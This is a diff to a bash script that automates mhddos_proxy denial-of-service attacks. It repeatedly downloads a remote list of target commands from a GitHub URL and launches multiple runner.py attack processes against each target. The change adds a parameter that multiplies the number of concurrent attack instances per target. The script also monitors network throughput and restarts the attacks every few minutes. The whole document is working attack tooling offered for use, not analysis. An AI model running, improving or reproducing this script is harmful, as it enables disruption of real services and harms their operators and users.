@@ -19,7 +19,8 @@ threads="${1:-1000}"
 threads="-t $threads"
 rpc="${2:-200}"
 rpc="--rpc $rpc"
-debug="${3:-}"
+instances="${3:-1}"
+debug="${4:-}"
 proxy_interval="-p 600"
 
 #Just in case kill previous copy of mhddos_proxy
@@ -28,42 +29,44 @@ pkill -f ./start.py
 pkill -f ifstat
 
 # Restart attacks and update targets list every 10 minutes (by default)
-while [[ 1 == 1 ]]
+while true
 #echo -e "#####################################\n"
 do
-   # Get number of targets in runner_targets. First 5 strings ommited, those are reserved as comments.
-   list_size=$(curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner_targets | cat | grep "^[^#]" | wc -l)
-   
-   echo -e "\nNumber of targets in list: $list_size \n"
+  # Get number of targets in runner_targets. First 5 strings ommited, those are reserved as comments.
+  list_size=$(curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner_targets | cat | grep -c "^[^#]")
 
-   
-      
-   # Launch multiple mhddos_proxy instances with different targets.
-   for (( i=1; i<=list_size; i++ ))
-   do
-            echo -e "\n I = $i"
-            # Filter and only get lines that starts with "runner.py". Then get one target from that filtered list.
-            cmd_line=$(awk 'NR=='"$i" <<< "$(curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner_targets | cat | grep "^[^#]")")
-           
+  echo -e "\nNumber of targets in list: $list_size \n"
 
-            echo "full cmd:"
-            echo "$cmd_line $proxy_interval $threads $rpc"
-            
-            cd ~/mhddos_proxy
-            python3 runner.py $cmd_line $threads $proxy_interval $rpc $debug&
-            echo -e "Attack started. Wait a few minutes for output"
-   done
+  # Launch multiple mhddos_proxy instances with different targets.
+  for (( i=1; i<=list_size; i++ ))
+  do
+    echo -e "\n I = $i"
 
-   echo -e "\nDDoS is monitoring eth0 interface (HH:MM:SS | KB/s in | KB/s out)"
-   #ifstat -i eth0 -t 60/30&
-   ifstat -a -z -n -t -T 1/5&
+    # Filter and only get lines that starts with "runner.py". Then get one target from that filtered list.
+    cmd_line=$(awk 'NR=='"$i" <<< "$(curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner_targets | cat | grep "^[^#]")")
 
-   echo -e "\nDDoS is up and Running, next update of targets list in $restart_interval\nSleeping\n"
-   sleep $restart_interval
-   clear
-   echo -e "\nRESTARTING\nKilling old processes..."
-   pkill -f runner.py
-   pkill -f ./start.py
-   pkill -f ifstat
-   echo -e "\nOld processes have been killed - starting new ones"
+    echo "full cmd:"
+    echo "$cmd_line $proxy_interval $threads $rpc"
+
+    cd ~/mhddos_proxy || exit
+
+    for (( j=1; j<=instances; j++ ))
+    do
+      python3 runner.py "$cmd_line" "$threads" "$proxy_interval" "$rpc" "$debug"&
+    done
+
+    echo -e "Attack started with $instances instances. Wait a few minutes for output"
+  done
+
+  echo -e "\nDDoS is monitoring eth0 interface (HH:MM:SS | KB/s in | KB/s out)"
+  ifstat -i eth0 -t 60/30&
+
+  echo -e "\nDDoS is up and Running, next update of targets list in $restart_interval\nSleeping\n"
+  sleep $restart_interval
+  clear
+  echo -e "\nRESTARTING\nKilling old processes..."
+  pkill -f runner.py
+  pkill -f ./start.py
+  pkill -f ifstat
+  echo -e "\nOld processes have been killed - starting new ones"
 done
